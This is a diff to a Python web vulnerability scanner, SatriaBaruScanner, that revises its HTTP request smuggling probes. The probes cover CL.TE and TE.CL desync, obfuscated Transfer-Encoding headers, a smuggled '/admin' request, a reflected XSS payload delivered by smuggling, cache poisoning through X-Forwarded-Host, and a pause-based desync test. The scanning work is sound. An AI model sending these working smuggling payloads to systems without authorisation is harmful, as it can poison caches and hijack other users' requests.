@@ -7369,10 +7369,8 @@ class SatriaBaruScanner:
                 s.sendall(raw)
                 if pause and i == 0:
                     _time.sleep(pause)
-            try:
-                s.shutdown(socket.SHUT_WR)
-            except Exception:
-                pass
+            # Jangan half-close koneksi sebelum respons dibaca; request terakhir
+            # pada setiap probe memakai Connection: close untuk terminasi yang eksplisit.
             deadline = start + t
             while _time.time() < deadline:
                 try:
@@ -7592,8 +7590,8 @@ class SatriaBaruScanner:
         if 94 not in self._confirmed and (tecl_seen or 92 in self._confirmed) and self._within_budget():
             ap = "/admin"
             b_status, b_body, _, _ = self._smug_normal_status(ap)
-            inner = f"GET {ap} HTTP/1.1\r\nHost: {cluster_host}\r\nContent-Length: 10\r\n\r\nx="
-            hexlen = format(len(inner), "x")
+            inner = f"GET {ap} HTTP/1.1\r\nHost: {cluster_host}\r\n\r\n"
+            hexlen = format(len(inner.encode("latin-1")), "x")
             chunked = f"{hexlen}\r\n{inner}\r\n0\r\n\r\n"
             smuggle = self._smug_build(
                 f"POST {base_path} HTTP/1.1",
@@ -7612,7 +7610,7 @@ class SatriaBaruScanner:
         # klaim apa pun akan menjadi false positive. Keduanya dibiarkan not_confirmed.
 
         # ---------- 106: obfuscating the TE header ----------
-        if 106 not in self._confirmed and not clte_seen and self._within_budget():
+        if 106 not in self._confirmed and self._within_budget():
             variants = [
                 ("Transfer-Encoding", "xchunked"),
                 ("Transfer-Encoding", " chunked"),
@@ -7664,7 +7662,12 @@ class SatriaBaruScanner:
                 res, _, _ = self._smug_exchange([smuggle, self._smug_get("/", close=True)], 2)
                 for r in res[1:]:
                     txt = r.get("body") or ""
-                    if re.search(r"(X-Forwarded-(?:For|Host|Proto)|X-Real-IP|X-Client-IP|CF-Connecting-IP)\s*:", txt, re.I):
+                    if re.search(
+                        r"(?:X-Forwarded-(?:For|Host|Proto)|X-Real-IP|X-Client-IP|CF-Connecting-IP)"
+                        r"\\s*:\\s*(?:https?://)?[A-Za-z0-9*._:-]{3,}",
+                        txt,
+                        re.I,
+                    ):
                         self._smug_mark(95, f"Rewriting front-end terungkap: header internal ter-refleksi pada respons "
                                             f"follow-up (HTTP {r['status']}) setelah smuggle ke {rpath} param {rparam}.",
                                         "smuggling_reveal_frontend_rewriting")
@@ -7673,7 +7676,8 @@ class SatriaBaruScanner:
         # ---------- 97: deliver reflected XSS ----------
         if 97 not in self._confirmed and (clte_seen or 91 in self._confirmed) and self._within_budget():
             xss = "<script>alert(1)</script>"
-            smuggled = f"GET /?search={xss} HTTP/1.1\r\nHost: {cluster_host}\r\n\r\n"
+            xss_path_value = "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
+            smuggled = f"GET /?search={xss_path_value} HTTP/1.1\r\nHost: {cluster_host}\r\n\r\n"
             body = "0\r\n\r\n" + smuggled
             smuggle = self._smug_build(
                 f"POST {base_path} HTTP/1.1",
@@ -7688,71 +7692,115 @@ class SatriaBaruScanner:
         # ---------- 107: web cache poisoning via smuggling ----------
         if 107 not in self._confirmed and (clte_seen or 91 in self._confirmed) and self._within_budget():
             poison_path = f"/?satria_smug={token}"
-            smuggled = f"GET {poison_path} HTTP/1.1\r\nHost: {cluster_host}\r\nX-Ignore: x\r\n\r\n"
+            poison_marker = f"satria-smuggle-{token}.invalid"
+            smuggled = (
+                f"GET {poison_path} HTTP/1.1\r\nHost: {cluster_host}\r\n"
+                f"X-Forwarded-Host: {poison_marker}\r\n\r\n"
+            )
             body = "0\r\n\r\n" + smuggled
             smuggle = self._smug_build(
                 f"POST {base_path} HTTP/1.1",
                 [("Host", cluster_host), ("Content-Length", "5"),
                  ("Transfer-Encoding", "chunked"), ("Connection", "keep-alive")],
                 body.encode())
-            b_res, _, _ = self._smug_exchange([self._smug_get(poison_path, close=True)], 1)
-            self._smug_exchange([smuggle], 1)
-            f_res, _, _ = self._smug_exchange([self._smug_get(poison_path, close=True)], 1)
-            if b_res and f_res:
-                bh = {k.lower(): v.lower() for k, v in b_res[0]["headers"].items()}
-                fh = {k.lower(): v.lower() for k, v in f_res[0]["headers"].items()}
-                cache_hdr = " ".join(fh.get(k, "") for k in ("x-cache", "x-cache-status", "cf-cache-status", "age"))
-                if f_res[0]["status"] != b_res[0]["status"] and (cache_hdr.strip() or f_res[0]["status"] in (301, 302, 400, 404)):
-                    self._smug_mark(107, f"Cache poisoning via smuggling: GET {poison_path} baseline "
-                                         f"{b_res[0]['status']} -> setelah smuggle {f_res[0]['status']} "
-                                         f"(cache={cache_hdr.strip()[:60]!r}).",
-                                    "smuggling_web_cache_poisoning")
+            baseline, _, _ = self._smug_exchange([self._smug_get(poison_path, close=True)], 1)
+            if baseline and self._within_budget():
+                self._smug_exchange([smuggle], 1)
+                after_first, _, _ = self._smug_exchange([self._smug_get(poison_path, close=True)], 1)
+                after_second, _, _ = self._smug_exchange([self._smug_get(poison_path, close=True)], 1)
+                if baseline and after_first and after_second:
+                    base = baseline[0]
+                    first = after_first[0]
+                    second = after_second[0]
+                    cache_hdr = " ".join(
+                        str(v) for k, v in second["headers"].items()
+                        if k.lower() in ("x-cache", "x-cache-status", "cf-cache-status", "age")
+                    ).lower()
+                    first_location = str(first["headers"].get("location", ""))
+                    second_location = str(second["headers"].get("location", ""))
+                    marker_reflected = (
+                        poison_marker in (first.get("body") or "")
+                        or poison_marker in first_location
+                    )
+                    stable_poison = (
+                        poison_marker in (second.get("body") or "")
+                        or poison_marker in second_location
+                    )
+                    explicit_cache_hit = bool(re.search(r"\b(?:hit|cached)\b", cache_hdr))
+                    baseline_clean = (
+                        poison_marker not in (base.get("body") or "")
+                        and poison_marker not in str(base["headers"].get("location", ""))
+                    )
+                    if (
+                        marker_reflected and stable_poison and explicit_cache_hit
+                        and baseline_clean and first["status"] == second["status"]
+                    ):
+                        self._smug_mark(
+                            107,
+                            f"Cache poisoning via smuggling terkonfirmasi: marker unik {poison_marker} "
+                            f"muncul pada dua respons sesudah probe, baseline bersih, dan cache "
+                            f"memberi status HIT ({cache_hdr[:80]}).",
+                            "smuggling_web_cache_poisoning",
+                        )
 
-        # ---------- 112: pause-based ----------
-        if 112 not in self._confirmed and 91 not in self._confirmed and 92 not in self._confirmed and self._within_budget():
-            smuggle = self._smug_build(
-                f"POST {base_path} HTTP/1.1",
-                [("Host", cluster_host), ("Content-Length", "30"), ("Connection", "keep-alive")],
-                b"")
-            try:
-                s = self._smug_connect(timeout=max(6.0, float(getattr(self, "timeout", 8.0) or 8.0)))
-            except Exception:
-                s = None
-            if s is not None:
-                buf = b""
+        # ---------- 112: server-side pause-based desync ----------
+        if 112 not in self._confirmed and self._within_budget():
+            baseline_status, _baseline_body, _, _ = self._smug_normal_status("/")
+            if baseline_status is not None and baseline_status not in (400, 404, 405, 501):
                 try:
-                    s.sendall(smuggle)
-                    _time.sleep(0.6)
-                    s.sendall(f"GET /404-{token} HTTP/1.1\r\nHost: {cluster_host}\r\n\r\n".encode())
-                    s.sendall(self._smug_get("/", close=True))
-                    try:
-                        s.shutdown(socket.SHUT_WR)
-                    except Exception:
-                        pass
-                    deadline = _time.time() + max(6.0, float(getattr(self, "timeout", 8.0) or 8.0))
-                    while _time.time() < deadline:
-                        try:
-                            chunk = s.recv(8192)
-                        except Exception:
-                            break
-                        if not chunk:
-                            break
-                        buf += chunk
-                except Exception:
-                    pass
-                finally:
-                    try:
-                        s.close()
-                    except Exception:
-                        pass
-                res = self._smug_parse_responses(buf)
-                second = res[1] if len(res) > 1 else None
-                if second is not None and second["status"] in (400, 404, 405, 501):
-                    b_status, _, _, _ = self._smug_normal_status("/")
-                    if b_status not in (400, 404, 405, 501):
-                        self._smug_mark(112, f"Pause-based smuggling: baseline GET / -> {b_status}, "
-                                             f"respons kedua setelah jeda -> {second['status']}.",
-                                        "smuggling_pause_based")
+                    pause_seconds = float(os.getenv("SATRIA_SMUG_PAUSE_SECONDS", "6"))
+                except (TypeError, ValueError):
+                    pause_seconds = 6.0
+                pause_seconds = max(2.0, min(8.0, pause_seconds))
+                smuggle = self._smug_build(
+                    f"POST {base_path} HTTP/1.1",
+                    [("Host", cluster_host), ("Content-Length", "30"), ("Connection", "keep-alive")],
+                    b"",
+                )
+                confirmed_trials: list[str] = []
+                for attempt in range(2):
+                    if not self._within_budget():
+                        break
+                    unique_path = f"/404-{token}-{attempt}"
+                    self._scan_progress_event(
+                        f"HTTP smuggling 112: uji jeda {pause_seconds:.1f} dtk, percobaan {attempt + 1}/2"
+                    )
+                    sequence = [
+                        smuggle,
+                        self._smug_get(unique_path, close=False),
+                        self._smug_get("/", close=True),
+                    ]
+                    responses, elapsed, err = self._smug_exchange(
+                        sequence,
+                        expect=2,
+                        timeout=max(8.0, pause_seconds + 4.0),
+                        pause=pause_seconds,
+                    )
+                    second = responses[1] if len(responses) > 1 else None
+                    if (
+                        second is not None
+                        and second.get("status") == 404
+                        and baseline_status != 404
+                    ):
+                        confirmed_trials.append(
+                            f"attempt {attempt + 1}: HTTP 404 pada {unique_path} ({elapsed:.2f}s)"
+                        )
+                    elif second is not None and second.get("status") in (400, 405, 501):
+                        response_body = (second.get("body") or "").lower()
+                        if re.search(r"invalid method|unrecognized method|bad request|gpost|gget", response_body):
+                            confirmed_trials.append(
+                                f"attempt {attempt + 1}: parser rejection HTTP {second['status']} ({elapsed:.2f}s)"
+                            )
+                    if err == "budget_exhausted":
+                        break
+                if len(confirmed_trials) == 2:
+                    self._smug_mark(
+                        112,
+                        f"Pause-based desync terkonfirmasi pada dua percobaan; baseline GET / "
+                        f"HTTP {baseline_status}; jeda {pause_seconds:.1f} dtk; "
+                        + "; ".join(confirmed_trials),
+                        "smuggling_pause_based",
+                    )
 
     def phase_ssrf(self, pages: list[Page], points: list[Point]) -> None:
         """Deteksi konservatif SSRF (84-90). Konfirmasi hanya pada bukti kuat:
